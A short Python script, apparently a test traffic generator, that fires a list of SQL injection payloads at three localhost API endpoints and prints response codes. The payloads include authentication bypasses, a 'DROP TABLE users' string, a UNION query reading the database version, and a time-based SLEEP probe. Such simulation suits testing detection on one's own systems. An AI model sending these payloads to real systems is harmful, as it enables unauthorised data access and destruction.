import requests
import time
import random

TARGET_URLS = [
    "http://localhost:8005/api/assets",
    "http://localhost:8005/api/scans",
    "http://localhost:8005/api/governance"
]

PAYLOADS = [
    "admin' OR 1=1 --",
    "'; DROP TABLE users --",
    "UNION SELECT NULL, NULL, version() --",
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --",
    "1) OR 1=1--",
    "admin' --",
    "admin\" --",
    "\" OR \"1\"=\"1"
]

def simulate_sqli():
    print(f"🚀 Starting Professional SQLi Simulation on {len(TARGET_URLS)} endpoints...")
    for payload in PAYLOADS:
        for url in TARGET_URLS:
            try:
                # Testing both GET and POST params
                params = {"query": payload, "id": f"id-{random.randint(100,999)}"}
                headers = {"User-Agent": "Mozilla/5.0 (PentestBot/1.0)", "X-Injection-Test": "SQLI"}
                
                resp = requests.get(url, params=params, headers=headers, timeout=2)
                print(f"[SQLi Sim] Payload: '{payload}' -> {url} - Status: {resp.status_code}")
                time.sleep(random.uniform(0.5, 2))
                
            except Exception as e:
                print(f"[SQLi Sim] Error: {e}")

    print("✅ SQLi Simulation Complete.")

if __name__ == "__main__":
    simulate_sqli()
